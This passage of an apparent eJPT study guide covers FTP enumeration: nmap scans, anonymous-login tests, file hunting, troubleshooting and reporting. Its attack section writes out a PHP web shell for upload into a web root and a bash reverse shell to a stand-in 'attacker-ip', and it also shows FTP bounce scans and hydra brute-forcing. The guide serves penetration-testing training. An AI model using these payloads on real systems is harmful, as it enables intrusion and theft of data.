nmap -b anonymous:password@<ftp-server> <internal-target>

# Bounce scan through compromised FTP server
nmap -p 21-23,25,53,80,110,143,443,993,995 -b ftp-user:ftp-pass@<ftp-server> <internal-network>
```

### Attack Vector 4: Malicious File Upload

#### Web Shell Upload (if FTP serves web content)
```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to web-accessible directory
ftp> cd /var/www/html
ftp> put shell.php

# Access via web browser
# http://target/shell.php?cmd=whoami
```

#### Reverse Shell Upload
```bash
# Create reverse shell script
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' > reverse.sh

# Upload to executable directory
ftp> put reverse.sh
ftp> site chmod +x reverse.sh

# Execute through other vulnerabilities or scheduled tasks
```

---

## 🎓 eJPT Exam Focus

### Critical Skills for eJPT Success

#### 1. Service Discovery and Identification (25%)
**Must-master commands:**
```bash
# Primary service discovery
nmap -p 21 -sV <target>

# Comprehensive FTP port scanning  
nmap -p 21,990,2121 -sV -sC <target>

# Quick FTP service verification
nc -nv <target> 21
```

**Success criteria:**
- [ ] Identify FTP service version
- [ ] Determine server software (vsftpd, ProFTPD, IIS FTP, etc.)
- [ ] Detect additional FTP ports
- [ ] Recognize FTPS (FTP over SSL)

#### 2. Anonymous Access Testing (40%)
**Must-master commands:**
```bash
# NSE script method (fastest)
nmap --script ftp-anon -p 21 <target>

# Manual verification
ftp <target>
# Try: anonymous/anonymous, anonymous/, ftp/ftp
```

**Exam scenarios:**
- **Scenario A**: FTP allows anonymous access → enumerate files and directories
- **Scenario B**: Anonymous access denied → proceed to brute force
- **Scenario C**: Anonymous read-only access → focus on information gathering

#### 3. Directory and File Enumeration (25%)
**Must-master commands:**
```bash
# Navigation and listing
ftp> pwd
ftp> ls -la  
ftp> dir -la

# Directory traversal
ftp> cd ..
ftp> cd /etc
ftp> cd /home

# File download
ftp> binary
ftp> get filename.txt
```

**Key directories to check:**
- `/pub/` - Public files
- `/home/` - User directories  
- `/etc/` - Configuration files
- `/var/log/` - Log files
- `/tmp/` - Temporary files
- `/upload/` - Upload directory

#### 4. File Analysis and Information Extraction (10%)
**Must-master techniques:**
```bash
# Local file analysis after download
cat textfile.txt
strings binaryfile
grep -i "password\|user\|admin\|key" *
file unknown_file
```

### eJPT Exam Strategy

#### Time Management
- **5 minutes**: Service discovery and identification
- **10 minutes**: Anonymous access testing and verification
- **15 minutes**: Directory enumeration and mapping
- **10 minutes**: File download and analysis
- **5 minutes**: Documentation and flag identification

#### Common eJPT Question Patterns
1. **"What FTP server software is running?"**
   - Answer format: `vsftpd 3.0.3` or `ProFTPD 1.3.5`
   - Command: `nmap -p 21 -sV <target>`

2. **"Does the FTP server allow anonymous access?"**
   - Answer format: `Yes` or `No`
   - Command: `nmap --script ftp-anon -p 21 <target>`

3. **"What files are accessible via anonymous FTP?"**
   - Answer format: List of filenames
   - Process: Anonymous login → `ls -la` → document all files

4. **"Find the flag in the FTP server"**
   - Process: Anonymous access → navigate directories → download files → search for flag format

### eJPT Practical Scenarios

#### Scenario 1: Basic FTP Enumeration
```bash
# Given target: 192.168.1.100
# Task: Enumerate FTP service and find accessible content

# Step 1: Service identification
nmap -p 21 -sV 192.168.1.100
# Output: 21/tcp open ftp vsftpd 3.0.3

# Step 2: Anonymous access test
nmap --script ftp-anon -p 21 192.168.1.100
# Output: Anonymous FTP login allowed

# Step 3: Manual enumeration
ftp 192.168.1.100
# Login: anonymous/anonymous
# Commands: pwd, ls -la, cd directories, get files

# Expected flag location: /pub/flag.txt or /home/user/flag.txt
```

#### Scenario 2: FTP with Upload Capability
```bash
# Task: Identify writable FTP directories

# After anonymous login
ftp> ls -la
ftp> cd upload
ftp> put test.txt
# Success indicates writable directory

# Document upload capability in report
# Potential attack vector: malicious file upload
```

---

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Connection Problems

#### Problem: "Connection refused" or timeouts
**Root causes:**
- FTP service not running on target
- Firewall blocking FTP ports
- Network connectivity issues
- Wrong target IP/port

**Troubleshooting steps:**
```bash
# 1. Verify target connectivity
ping <target>

# 2. Check FTP port accessibility  
nmap -p 21 <target>
telnet <target> 21

# 3. Try alternative FTP ports
nmap -p 21,990,2121,8021 <target>

# 4. Check for FTP over different protocols
nmap --script ssl-enum-ciphers -p 990 <target>  # FTPS
nmap -sU -p 69 <target>                        # TFTP
```

### Issue 2: Active vs Passive Mode Problems

#### Problem: Data connection failures during file transfers
**Root cause:** Firewall or NAT blocking FTP data connections

**Solution strategies:**
```bash
# Enable passive mode (recommended)
ftp> passive
# Output: Passive mode on

# Use lftp (passive mode by default)  
lftp ftp://anonymous@<target>

# Force passive mode in scripts
echo "set ftp:passive-mode true" > ~/.lftprc

# Alternative: try active mode explicitly
ftp> passive
# Output: Passive mode off
```

### Issue 3: Permission and Access Errors

#### Problem: "550 Permission denied" errors
**Troubleshooting approach:**
```bash
# 1. Check current directory permissions
ftp> ls -la

# 2. Try different directories
ftp> cd /tmp
ftp> cd /pub  
ftp> cd /upload

# 3. Verify transfer mode
ftp> binary    # For non-text files
ftp> ascii     # For text files

# 4. Check file/directory existence  
ftp> ls filename.txt
ftp> pwd
```

### Issue 4: Authentication Failures

#### Problem: Anonymous access denied
**Alternative approaches:**
```bash
# Try different anonymous credentials
# Method 1: anonymous/[blank]
# Method 2: anonymous/anonymous  
# Method 3: anonymous/user@domain.com
# Method 4: ftp/ftp
# Method 5: guest/guest

# Use NSE script for comprehensive testing
nmap --script ftp-anon,ftp-brute -p 21 <target>

# Manual testing with expect
expect << EOF
spawn ftp $target
expect "Name"
send "anonymous\r"
expect "Password:"
send "\r"
expect {
    "230" { puts "SUCCESS" }
    "530" { puts "FAILED" }
}
EOF
```

### Issue 5: Large File Transfer Problems

#### Problem: Transfer interruptions or corruption
**Solutions:**
```bash
# Use lftp for resume capability
lftp> set ftp:retry 3
lftp> get -c large_file.zip    # Resume interrupted transfer

# Verify file integrity
md5sum downloaded_file
# Compare with server-side hash if available

# Use binary mode for non-text files
ftp> binary
ftp> hash              # Show transfer progress
ftp> get large_file.bin
```

---

## 🌍 Real-World Scenarios

### Scenario 1: Corporate FTP Server Assessment

#### Background
Target: Corporate FTP server hosting customer data and internal documents

#### Enumeration Process
```bash
# Phase 1: Reconnaissance
nmap -p 21,990,2121 -sV -sC corporate-ftp.company.com

# Phase 2: Anonymous access testing
nmap --script ftp-anon -p 21 corporate-ftp.company.com

# Phase 3: If anonymous fails, brute force common accounts
hydra -L corporate-users.txt -P corporate-passwords.txt ftp://corporate-ftp.company.com

# Phase 4: Comprehensive enumeration after access
lftp ftp://discovered-user:discovered-pass@corporate-ftp.company.com
lftp> find . -name "*.pdf" | head -20
lftp> find . -name "*customer*" | head -10
lftp> find . -name "*financial*" | head -10
```

#### Key Findings to Look For
- Customer databases or contact lists
- Financial reports or sensitive documents
- Configuration files with credentials
- Backup files containing sensitive data
- User directories with personal information

### Scenario 2: Internet-Facing FTP Honeypot

#### Background
Publicly accessible FTP server that may be intentionally vulnerable

#### Safe Enumeration Approach
```bash
# 1. Careful reconnaissance to avoid detection
nmap -T2 -p 21 -sV honeypot-ftp.example.com

# 2. Test anonymous access cautiously
timeout 30 ftp honeypot-ftp.example.com
# Try anonymous login once

# 3. Limited enumeration to avoid triggering alerts
ftp> ls
ftp> pwd  
ftp> cd pub
ftp> ls

# 4. Download only obviously accessible files
ftp> get README.txt
ftp> get public-info.txt
```

#### Red Flags to Watch For
- Overly permissive access to sensitive areas
- Fake documents designed to waste time
- Logging mechanisms that track all activities
- Delayed responses indicating monitoring

### Scenario 3: Legacy FTP Server on Internal Network

#### Background
Old FTP server discovered during internal network penetration testing

#### Comprehensive Assessment
```bash
# 1. Version identification for vulnerability research
nmap -p 21 -sV --script vuln legacy-ftp.internal

# 2. Test for known backdoors
nmap --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 legacy-ftp.internal

# 3. Anonymous access testing
nmap --script ftp-anon -p 21 legacy-ftp.internal

# 4. Brute force with internal domain credentials
hydra -L internal-users.txt -P internal-passwords.txt ftp://legacy-ftp.internal

# 5. Comprehensive file system exploration
lftp ftp://user:pass@legacy-ftp.internal
lftp> mirror --dry-run .    # Preview full structure
lftp> find . -name "*.bak"  # Look for backup files
lftp> find . -name "*.old"  # Look for old configuration files
```

#### Legacy System Considerations
- Weak authentication mechanisms
- Unpatched security vulnerabilities
- Plain text credential storage
- Extensive file system access
- Integration with other internal systems

---

## 📝 Documentation and Reporting

### Evidence Collection Framework

#### Required Screenshots
1. **Service Discovery**
   - Nmap scan results showing FTP service identification
   - Banner grabbing output showing version information

2. **Access Testing**
   - NSE script output for anonymous access testing
   - Manual FTP login attempts and results

3. **Enumeration Results**
   - Directory listing outputs (`ls -la`)
   - File download confirmations
   - Permission testing results

4.
